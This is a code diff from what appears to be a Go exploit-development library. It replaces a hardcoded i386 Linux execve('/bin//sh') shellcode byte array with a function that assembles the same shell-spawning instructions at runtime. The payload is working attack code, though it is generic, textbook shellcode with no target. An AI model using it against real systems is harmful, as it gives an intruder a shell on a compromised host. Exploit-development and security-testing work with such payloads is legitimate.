@@ -1,12 +1,33 @@
 package shellcode
 
-var I386ExecveShell = []byte{
-	0x31, 0xc9, // xor eax, eax
-	0xf7, 0xe1, // mul ecx
-	0x51,                         // push ecx
-	0x68, 0x2f, 0x2f, 0x73, 0x68, // push '//sh'
-	0x68, 0x2f, 0x62, 0x69, 0x6e, // push '/bin'
-	0x89, 0xe3, // mov ebx, esp
-	0xb0, 0x0b, // mov al, 0xb
-	0xcd, 0x80, // int 0x80
+import (
+	sp "github.com/zznop/sploit"
+)
+
+type I386 struct {
+	arch *sp.Processor
+}
+
+func NewI386() *I386 {
+	arch := &sp.Processor{
+		Architecture: sp.ArchI386,
+		Endian:       sp.LittleEndian,
+	}
+
+	return &I386{
+		arch: arch,
+	}
+}
+
+func (i386 *I386) LinuxShell() ([]byte, error) {
+	instrs := `xor ecx, ecx
+               mul ecx
+               push ecx
+               push 0x68732f2f
+               push 0x6e69622f
+               mov ebx, esp
+               mov al, 0xb
+               int 0x80
+`
+	return sp.Asm(i386.arch, instrs)
 }
